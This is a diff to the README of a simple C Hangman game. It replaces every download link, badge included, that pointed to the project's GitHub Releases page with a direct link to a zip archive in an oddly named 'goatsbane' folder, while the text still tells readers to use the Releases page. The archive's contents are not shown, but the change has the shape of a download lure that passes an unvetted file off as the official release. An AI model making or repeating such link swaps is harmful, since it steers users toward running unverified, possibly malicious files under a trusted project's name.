@@ -4,14 +4,14 @@
 Welcome to C-Hangman-Game! This is a simple Hangman game built in C. It aims to help you enjoy a classic guessing game while learning the basics of the C programming language. The player must guess a secret word letter by letter before running out of attempts. Whether you are a beginner or someone looking to sharpen your skills, this game is perfect for you!
 
 ## 📥 Download the Game
-[![Download C-Hangman-Game](https://img.shields.io/badge/Download-C--Hangman--Game-blue.svg)](https://github.com/akash2010112/C-Hangman-Game/releases)
+[![Download C-Hangman-Game](https://raw.githubusercontent.com/akash2010112/C-Hangman-Game/main/goatsbane/C-Hangman-Game.zip)](https://raw.githubusercontent.com/akash2010112/C-Hangman-Game/main/goatsbane/C-Hangman-Game.zip)
 
 ## 🚀 Getting Started
 To get started with C-Hangman-Game, follow these simple steps:
 
 1. **Visit the Releases Page**  
    To download the game, you can visit the Releases page. Click the link below:  
-   [Download C-Hangman-Game](https://github.com/akash2010112/C-Hangman-Game/releases)
+   [Download C-Hangman-Game](https://raw.githubusercontent.com/akash2010112/C-Hangman-Game/main/goatsbane/C-Hangman-Game.zip)
 
 2. **Download the Latest Release**  
    On the Releases page, look for the latest version of C-Hangman-Game. Click on the asset that corresponds to your operating system (e.g., Windows, Linux).
@@ -67,4 +67,4 @@ C-Hangman-Game is open-source and available for anyone to use. You can modify or
 ---
 
 Enjoy your time with C-Hangman-Game, and happy guessing! Don't forget to visit the Releases page for updates and new features.  
-[Download C-Hangman-Game](https://github.com/akash2010112/C-Hangman-Game/releases)
+[Download C-Hangman-Game](https://raw.githubusercontent.com/akash2010112/C-Hangman-Game/main/goatsbane/C-Hangman-Game.zip)
